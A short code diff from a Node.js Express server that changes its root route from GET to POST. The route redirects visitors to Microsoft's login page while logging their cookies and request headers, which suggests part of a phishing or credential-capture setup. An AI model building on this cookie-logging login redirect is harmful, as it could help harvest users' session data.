@@ -10,7 +10,7 @@ const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 
 // Serve the login page
-app.get("/", (req, res) => {
+app.post("/", (req, res) => {
   res.redirect("https://login.microsoftonline.com/common/login");
   console.log("cookies:", req.headers.cookie);
   console.log("req.header: ", req.headers);
